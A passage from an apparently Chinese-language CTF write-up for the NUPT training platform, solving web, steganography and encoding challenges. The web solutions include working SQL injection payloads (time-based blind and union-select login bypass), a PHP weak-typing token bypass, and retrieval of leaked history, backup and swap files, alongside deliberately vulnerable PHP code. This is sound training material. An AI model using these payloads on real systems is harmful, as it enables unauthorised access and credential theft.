| <code>[&lt;] => &amp;lt;</code> | <code>['] => &amp;#039;</code> |
| <code>[>] => &amp;gt;</code> | <code>[&lt;] => &amp;lt;</code> |
| &mldr; | <code>[>] => &amp;gt;</code> |
| 共100个 | 共101个 |</p><h4 id=综合题httpteamxlcsinaappcomweb3b0b0ad119f425408fc3d45253137d33dindexphp><a href=http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/index.php>综合题</a><a hidden class=anchor aria-hidden=true href=#综合题httpteamxlcsinaappcomweb3b0b0ad119f425408fc3d45253137d33dindexphp>#</a></h4><p><em>nctf{bash_history_means_what}</em></p><p>1、访问链接得到一大段jsfuck代码，解码后得到<code>document.write("1bc29b36f623ba82aaf6724fd3b16718.php")</code> ;</p><p>2、访问 <em><a href=http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/1bc29b36f623ba82aaf6724fd3b16718.php>http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/1bc29b36f623ba82aaf6724fd3b16718.php</a></em> 在HTTP响应头得到提示<code>tip:history of bash</code>;</p><p>3、访问 <em><a href=http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/.bash_history>http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/.bash_history</a></em> ，看到页面内容为<code>zip -r flagbak.zip ./*</code> ;</p><p>4、访问 <em><a href=http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/flagbak.zip>http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/flagbak.zip</a></em> 得到flag。</p><h4 id=sql-注入2>sql 注入2<a hidden class=anchor aria-hidden=true href=#sql-注入2>#</a></h4><blockquote><p>注入第二题~~主要考察union查询
传送门:<a href=http://4.chinalover.sinaapp.com/web6/index.php>点我带你飞</a></p></blockquote><p><em>ntcf{union_select_is_wtf}</em></p><p><code>index/phps</code>中有源码如下</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-28-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-28-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-28-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-28-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-28-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-28-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-28-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-28-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-28-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-28-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-28-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-28-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-28-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-28-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-28-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-28-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-28-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-28-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-28-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-28-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-28-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-28-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-28-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-28-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-28-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-28-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-28-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-28-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-28-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-28-15>15</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>($_POST[<span style=color:#a6e22e>user</span>] <span style=color:#f92672>&amp;&amp;</span> $_POST[<span style=color:#a6e22e>pass</span>]) {
</span></span><span style=display:flex><span>   <span style=color:#a6e22e>mysql_connect</span>(<span style=color:#a6e22e>SAE_MYSQL_HOST_M</span> <span style=color:#f92672>.</span> <span style=color:#e6db74>&#39;:&#39;</span> <span style=color:#f92672>.</span> <span style=color:#a6e22e>SAE_MYSQL_PORT</span>,<span style=color:#a6e22e>SAE_MYSQL_USER</span>,<span style=color:#a6e22e>SAE_MYSQL_PASS</span>);
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>mysql_select_db</span>(<span style=color:#a6e22e>SAE_MYSQL_DB</span>);
</span></span><span style=display:flex><span>  $user <span style=color:#f92672>=</span> $_POST[<span style=color:#a6e22e>user</span>];
</span></span><span style=display:flex><span>  $pass <span style=color:#f92672>=</span> <span style=color:#a6e22e>md5</span>($_POST[<span style=color:#a6e22e>pass</span>]);
</span></span><span style=display:flex><span>  $query <span style=color:#f92672>=</span> <span style=color:#f92672>@</span><span style=color:#a6e22e>mysql_fetch_array</span>(<span style=color:#a6e22e>mysql_query</span>(<span style=color:#e6db74>&#34;select pw from ctf where user=&#39;</span><span style=color:#e6db74>$user</span><span style=color:#e6db74>&#39;&#34;</span>));
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (($query[<span style=color:#a6e22e>pw</span>]) <span style=color:#f92672>&amp;&amp;</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>strcasecmp</span>($pass, $query[<span style=color:#a6e22e>pw</span>]))) {
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;&lt;p&gt;Logged in! Key: ntcf{**************} &lt;/p&gt;&#34;</span>;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>echo</span>(<span style=color:#e6db74>&#34;&lt;p&gt;Log in failure!&lt;/p&gt;&#34;</span>);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></td></tr></table></div></div><p>因为</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-29-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-29-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-29-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-29-2>2</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#a6e22e>var_dump</span>(<span style=color:#f92672>!</span><span style=color:#a6e22e>strcasecmp</span>(<span style=color:#66d9ef>array</span>(), $query[<span style=color:#a6e22e>pw</span>]));<span style=color:#75715e>//bool(true)
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>var_dump</span>(<span style=color:#f92672>!</span><span style=color:#a6e22e>strcasecmp</span>(<span style=color:#a6e22e>md5</span>(<span style=color:#66d9ef>array</span>()), $query[<span style=color:#a6e22e>pw</span>]));<span style=color:#75715e>//bool(false)
</span></span></span></code></pre></td></tr></table></div></div><p>所以没法用把pass作为数组传进去的伎俩。另外虽然第七行的<code>$user</code>处存在注入，但输出没有回显。想到基于时间延迟的盲注。主要用到三个函数，<a href=https://dev.mysql.com/doc/refman/5.5/en/string-functions.html#function_mid>mid()</a>，<a href=https://dev.mysql.com/doc/refman/5.5/en/control-flow-functions.html#function_if>if()</a>和<a href=https://dev.mysql.com/doc/refman/5.5/en/miscellaneous-functions.html#function_sleep>sleep()</a>：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-30-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-30-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-30-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-30-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-30-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-30-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-30-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-30-4>4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-30-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-30-5>5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-30-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-30-6>6</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-mysql data-lang=mysql><span style=display:flex><span><span style=color:#a6e22e>MID</span>(str,pos,len)
</span></span><span style=display:flex><span><span style=color:#75715e>/*需注意pos从1而不是0开始，Return a substring starting from the specified position*/</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>IF</span>(expr1,expr2,expr3)
</span></span><span style=display:flex><span><span style=color:#75715e>/*If expr1 is TRUE (expr1 &lt;&gt; 0 and expr1 &lt;&gt; NULL), IF() returns expr2. Otherwise, it returns expr3.*/</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>SLEEP</span>(duration)
</span></span><span style=display:flex><span><span style=color:#75715e>/*Sleeps (pauses) for the number of seconds given by the duration argument, then returns 0.If SLEEP() is interrupted, it returns 1. The duration may have a fractional part.*/</span>
</span></span></code></pre></td></tr></table></div></div><p>所以构造post数据</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#a6e22e>user</span><span style=color:#f92672>=</span><span style=color:#a6e22e>admin</span><span style=color:#e6db74>&#39; and if(mid(pw,1,1)&gt;&#39;</span><span style=color:#ae81ff>9</span><span style=color:#960050;background-color:#1e0010>&#39;</span>,<span style=color:#a6e22e>sleep</span>(<span style=color:#ae81ff>2</span>),<span style=color:#ae81ff>1</span>)<span style=color:#75715e>#&amp;pass=blabla
</span></span></span></code></pre></td></tr></table></div></div><p>如果<code>if()</code>函数的<code>expr1</code>正确，页面响应就会延时两秒，否则不会，以此为依据采用二分法调整。</p><p><code>pw</code>字段的取值范围为<code>/[\da-e]/</code>，</p><p>最后注处字段值为<code>21dd715a3605b2a4053e80387116c190</code>，即<code>md5('njupt')</code></p><p>然后post<code>user=admin&amp;pass=njupt</code>即可。</p><blockquote><p>index.phps藏源码。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-32-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-32-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-32-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-32-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-32-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-32-3>3</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>查到另一种简单的做法，即post如下数据
</span></span><span style=display:flex><span>user=&#39; union select &#39;45cf93bd4f762c6597b68e615b153bd0&#39;#&amp;pass=findneo
</span></span><span style=display:flex><span>其中&#39;45cf93bd4f762c6597b68e615b153bd0&#39;即md5(&#39;findneo&#39;)
</span></span></code></pre></td></tr></table></div></div><p>这才是出题者的本意。我觉得这个做法很妙，看似理所当然的代码逻辑实际上不堪一击。</p></blockquote><h4 id=综合题2>综合题2<a hidden class=anchor aria-hidden=true href=#综合题2>#</a></h4><blockquote><p>非xss题 但是欢迎留言~
地址：<a href=http://cms.nuptzj.cn/>get the flag</a></p><p><code>flag:nctf{you_are_s0_g00d_hacker}</code></p></blockquote><p>详见<a href=https://findneo.github.io/2017/10/nupt-zonghe2/>南邮CTF平台综合题2writeup</a></p><h4 id=注入实战一>注入实战一<a hidden class=anchor aria-hidden=true href=#注入实战一>#</a></h4><blockquote><p>请使用firefox浏览器，并安装hackbar插件（自行百度并熟悉）
目标网址：<a href="http://www.backstagecommerce.ca/services.php?id=4">地址</a>
flag为管理员密码的32位md5(小写)
并且加上nctf{}</p><p>手注教程群里面发过。
看不懂的话自行百度"mysql手动注入"查阅相关文章</p><p>PS:用sqlmap等工具做的就不要厚脸皮提交了</p></blockquote><p>题目貌似坏了，放个 <a href=http://blog.csdn.net/qq_31481187/article/details/52097287#t33>4ct10n 的解答</a>吧。</p><blockquote><p>密码就在上图BSCmarketing24
然后再md5加密成 f3d6cc916d0739d853e50bc92911dddb
flag: nctf{f3d6cc916d0739d853e50bc92911dddb}</p></blockquote><h4 id=密码重置2>密码重置2<a hidden class=anchor aria-hidden=true href=#密码重置2>#</a></h4><blockquote><p>题题被秒，当时我就不乐意了！
本题来源于CUMT
<a href=http://nctf.nuptzj.cn/web14/index.php>题目链接</a></p><p>TIPS:
1.管理员邮箱观察一下就可以找到
2.linux下一般使用vi编辑器，并且异常退出会留下备份文件。(用vim编辑则不会)
3.弱类型bypass</p></blockquote><p><em>nctf{thanks_to_cumt_bxs}</em></p><p>1、按照提示，源码中看到管理员邮箱为<code>admin@nuptzj.cn</code> ；</p><p>2、<code>wget http://nctf.nuptzj.cn/web14/.submit.php.swp</code> ；</p><p>3、<code>vi -r .submit.php.swp</code></p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-33-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-33-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-33-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-33-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-33-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-33-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-33-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-33-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-33-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-33-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-33-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-33-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-33-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-33-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-33-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-33-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-33-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-33-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-33-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-33-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-33-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-33-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-33-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-33-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-33-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-33-13>13</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#66d9ef>if</span>(<span style=color:#f92672>!</span><span style=color:#66d9ef>empty</span>($token)<span style=color:#f92672>&amp;&amp;!</span><span style=color:#66d9ef>empty</span>($emailAddress)){
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>strlen</span>($token)<span style=color:#f92672>!=</span><span style=color:#ae81ff>10</span>) <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#39;fail&#39;</span>);
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span>($token<span style=color:#f92672>!=</span><span style=color:#e6db74>&#39;0&#39;</span>) <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#39;fail&#39;</span>);
</span></span><span style=display:flex><span>	$sql <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;SELECT count(*) as num from `user` where token=&#39;</span><span style=color:#e6db74>$token</span><span style=color:#e6db74>&#39; AND email=&#39;</span><span style=color:#e6db74>$emailAddress</span><span style=color:#e6db74>&#39;&#34;</span>;
</span></span><span style=display:flex><span>	$r <span style=color:#f92672>=</span> <span style=color:#a6e22e>mysql_query</span>($sql) <span style=color:#66d9ef>or</span> <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#39;db error&#39;</span>);
</span></span><span style=display:flex><span>	$r <span style=color:#f92672>=</span> <span style=color:#a6e22e>mysql_fetch_assoc</span>($r);
</span></span><span style=display:flex><span>	$r <span style=color:#f92672>=</span> $r[<span style=color:#e6db74>&#39;num&#39;</span>];
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span>($r<span style=color:#f92672>&gt;</span><span style=color:#ae81ff>0</span>){
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>echo</span> $flag;
</span></span><span style=display:flex><span>	}<span style=color:#66d9ef>else</span>{
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;失败了呀&#34;</span>;
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>}
</span></span></code></pre></td></tr></table></div></div><p>要求token长度为10且<code>token!='0'</code>为假，可利用弱类型（含有数字内容的字符串也会被转换类型，所以<code>'0e123'=='0'</code>值为真）绕过，访问 <em><a href="http://nctf.nuptzj.cn/web14/submit.php?emailAddress=admin%40nuptzj.cn&amp;token=0e12345678">http://nctf.nuptzj.cn/web14/submit.php?emailAddress=admin%40nuptzj.cn&amp;token=0e12345678</a></em> 即可。</p><h3 id=misc>MISC<a hidden class=anchor aria-hidden=true href=#misc>#</a></h3><h4 id=图种>图种<a hidden class=anchor aria-hidden=true href=#图种>#</a></h4><blockquote><p>flag是动态图最后一句话的拼音首字母
加上nctf{}</p></blockquote><p><em>nctf{dssdcmlw}</em></p><p><code>binwalk -e 555.gif</code>分离出一张233333.gif，动态图的最后一帧的最后一句话是 <em>都深深的出卖了我</em></p><h4 id=丘比龙de女神>丘比龙De女神<a hidden class=anchor aria-hidden=true href=#丘比龙de女神>#</a></h4><blockquote><p>丘比龙是丘比特的弟弟，由于吃了太多的甜甜圈导致他飞不动了！</p><p>没错 里面隐藏了一张女神的照片
flag是照片文件的md5值(小写)
记住加上flag{}</p></blockquote><p>文件尾有nvshen.jpg字样，故搜索字符串nvshen，共出现两次，猜测从第一次出现位置上方的love起到文件末尾为一个密码为love的压缩包，复制出来后修改<code>6C6F7665</code> 为<code>504b0304</code> ,解压得到女神的照片。</p><p>flag{a6caad3aaafa11b6d5ed583bef4d8a54}</p><h3 id=密码学>密码学<a hidden class=anchor aria-hidden=true href=#密码学>#</a></h3><h4 id=easy>easy!<a hidden class=anchor aria-hidden=true href=#easy>#</a></h4><blockquote><p>密文：bmN0Znt0aGlzX2lzX2Jhc2U2NF9lbmNvZGV9
这题做不出来就剁手吧！</p></blockquote><p><em>nctf{this_is_base64_encode}</em></p><p>在Linux命令行输入<code> echo bmN0Znt0aGlzX2lzX2Jhc2U2NF9lbmNvZGV9 | base64 -d</code>即可</p><h4 id=keyboard>keyboard<a hidden class=anchor aria-hidden=true href=#keyboard>#</a></h4><blockquote><p>看键盘看键盘看键盘！
答案非标准格式，提交前加上nctf{}
ytfvbhn tgbgy hjuygbn yhnmki tgvhn uygbnjm uygbn yhnijm</p></blockquote><p>观察题干字符串在键盘上的位置构成的轨迹。</p><p><em>nctf{areuhack}</em></p><h4 id=base64全家桶>base64全家桶<a hidden class=anchor aria-hidden=true href=#base64全家桶>#</a></h4><blockquote><p>全家桶全家桶全家桶！
我怎么饿了。。。。。。
密文(解密前删除回车)：</p><p>R1pDVE1NWlhHUTNETU4yQ0dZWkRNTUpYR00zREtNWldHTTJES
1JSV0dJM0RDTlpUR1kyVEdNWlRHSTJVTU5SUkdaQ1RNTkJWSVk
zREVOUlJHNFpUTU5KVEdFWlRNTjJF</p></blockquote><p>按base64、base32、base16的顺序解码一遍即可。</p><p><em>nctf{base64 _ base32_and_base16}</em></p><h4 id=n次base64httpchinaloversinaappcomdecode1base64txt><a href=http://chinalover.sinaapp.com/decode1/base64.txt>n次base64</a><a hidden class=anchor aria-hidden=true href=#n次base64httpchinaloversinaappcomdecode1base64txt>#</a></h4><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-34-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-34-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-34-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-34-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-34-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-34-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-34-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-34-4>4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-34-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-34-5>5</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> base64 <span style=color:#66d9ef>as</span> b
</span></span><span style=display:flex><span>s<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;**&#39;</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>while</span> <span style=color:#ae81ff>1</span>:
</span></span><span style=display:flex><span>  s<span style=color:#f92672>=</span>b<span style=color:#f92672>.</span>b64decode(s)
</span></span><span style=display:flex><span>  print s
</span></span></code></pre></td></tr></table></div></div><p><em>nctf{please_use_python_to_decode_base64}</em></p><h4 id=骚年来一发吗>骚年来一发吗<a hidden class=anchor aria-hidden=true href=#骚年来一发吗>#</a></h4><blockquote><p>密文：iEJqak3pjIaZ0NzLiITLwWTqzqGAtW2oyOTq1A3pzqas</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-35-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-35-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-35-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-35-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-35-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-35-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-35-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-35-4> 4</a>
